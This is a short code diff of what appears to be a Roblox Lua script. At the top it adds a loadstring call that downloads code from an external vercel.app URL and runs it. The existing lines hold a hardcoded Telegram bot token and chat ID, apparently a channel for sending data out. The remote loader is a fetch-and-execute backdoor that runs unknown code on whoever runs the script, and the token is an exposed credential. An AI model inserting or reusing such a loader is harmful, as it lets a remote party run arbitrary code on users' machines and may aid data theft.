@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://scriptsneonauth.vercel.app/api/scripts/4a200654-19c4-4d23-9fa1-dab7182adb0e/raw"))()
+
+
 local TELEGRAM_TOKEN = "7549387448:AAGMAP-M_Dfeck_cM_KZWLPPQENwx_NFzl0"
 local CHAT_ID = "7554045989"
 
